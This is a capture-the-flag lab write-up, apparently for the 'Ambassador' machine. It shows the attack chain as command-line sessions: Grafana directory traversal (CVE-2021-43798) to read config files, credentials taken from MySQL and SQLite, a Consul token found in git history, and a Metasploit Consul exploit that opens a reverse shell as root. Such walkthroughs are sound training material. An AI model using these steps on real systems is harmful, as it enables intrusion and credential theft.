## Enumeration

```
$ nmap 10.10.11.183 -T4 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 08:47 PST
Nmap scan report for 10.10.11.183
Host is up (0.079s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 45.04 seconds
```

- In `http://10.10.11.183`, we found a username `developer` but no password provided.
- In `http://10.10.11.183:3000`, there is a `grafana` portal with version `8.2.0`.

## Grafana

- After googling, we knew that Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 
  8.2.7, or 8.3.1 are vulnerable to directory traversal, `CVE-2021-43798`.

- Using metasploit `scanner/http/grafana_plugin_traversal`, we can download the file on the machine. The file would be saved in `~/.msf4/loot/`.

```
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > run

[+] Detected vulnerable Grafina: 8.2.0
[*] 10.10.11.183 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 10.10.11.183:3000 - File saved in: /home/parallels/.msf4/loot/20221223090532_default_10.10.11.183_grafana.loot_867160.ini
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- We downloaded `/etc/grafana/grafana.ini` and got `admin_password = messageInABottle685427`.
- Then, we logged in to grafana with credential `admin:messageInABottle685427`

- In the `http://10.10.11.183:3000/admin/settings`, we found the database setting with some interesting info.
  - `host	127.0.0.1:3306`, this is the mysql that we have enumerated
  - `name	grafana`
  - `path	grafana.db`
  - `type	sqlite3`
  - `user	root`

- Then, we use metasploit to fetch `/var/lib/grafana.db`. We can open it on `SQLite database browser`.
- In `data_source` table, we get mysql credential `grafana:dontStandSoCloseToMe63221!`

## MySQL

```
$ mysql -u grafana -h 10.10.11.183 -p

MySQL [none]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (18.664 sec)

MySQL [none]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.093 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.082 sec)

```

```
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

- Running base64 decode, and then we got `developer:anEnglishManInNewYork027468`
- We can use this credential to access ssh.

## Privilege Escalation

- In `.gitconfig`, we got information that there is a git directory `/opt/my-app`. 

```
developer@ambassador:~$ ll
total 48
drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 ./
drwxr-xr-x 3 root      root      4096 Mar 13  2022 ../
lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
drwx------ 3 developer developer 4096 Mar 13  2022 .cache/
-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg/
drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local/
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 3 developer developer 4096 Mar 14  2022 snap/
drwx------ 2 developer developer 4096 Mar 13  2022 .ssh/
-rw-r----- 1 root      developer   33 Dec 25 23:47 user.txt
developer@ambassador:~$ cat .gitconfig 
[user]
        name = Developer
        email = developer@ambassador.local
[safe]
        directory = /opt/my-app
```

- We check the commit history to find out any leaked sensitive data. Then we got consul token `bb03b43b-1d81-d62b-24b5-39540ee469b5`.

```
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

- After googling the `consul` service, we found out that it could be vulnerable to remote command execution (RCE). Also, the service is run by `root`.

```
developer@ambassador:/opt/my-app$ ps aux | grep consul
root        1097  0.3  3.7 796148 75792 ?        Ssl  Dec25   4:10 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

- I used meatsploit to execute the attack.
  1. Since the service is not on an open port, `ssh -L 8500:localhost:8500 developer@10.10.11.183` should be run to create ssh tunnel.
  2. Set `acl_token` to `bb03b43b-1d81-d62b-24b5-39540ee469b5`, `rhost` to `0.0.0.0`, `lhost` to the attack machine's tun0, and `lport` to any unused port.

```
msf6 exploit(multi/misc/consul_service_exec) > info

       Name: Hashicorp Consul Remote Command Execution via Services API
     Module: exploit/multi/misc/consul_service_exec
   Platform: 
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2018-08-11

Provided by:
  Bharadwaj Machiraju <bharadwaj.machiraju@gmail.com>
  Francis Alexander <helofrancis@gmail.com >
  Quentin Kaiser <kaiserquentin@gmail.com>
  Matthew Lucas <mattglucas97@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Linux
  1   Windows

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  ACL_TOKEN                   no        Consul Agent ACL token
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT      8500             yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The base path
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits Hashicorp Consul's services API to gain remote 
  command execution on Consul nodes.

References:
  https://www.consul.io/api/agent/service.html
  https://github.com/torque59/Garfield


msf6 exploit(multi/misc/consul_service_exec) > set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5
acl_token => bb03b43b-1d81-d62b-24b5-39540ee469b5
msf6 exploit(multi/misc/consul_service_exec) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 exploit(multi/misc/consul_service_exec) > set lhost 10.10.14.87
lhost => 10.10.14.87
msf6 exploit(multi/misc/consul_service_exec) > set lport 4040
lport => 4040
msf6 exploit(multi/misc/consul_service_exec) > run

[*] Started reverse TCP handler on 10.10.14.87:4040 
[*] Creating service 'qQiFUP'
[*] Service 'qQiFUP' successfully created.
[*] Waiting for service 'qQiFUP' script to trigger
[*] Sending stage (1017704 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.87:4040 -> 10.10.11.183:42032) at 2022-12-26 09:58:11 -0800
[*] Removing service 'qQiFUP'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid
Server username: root
```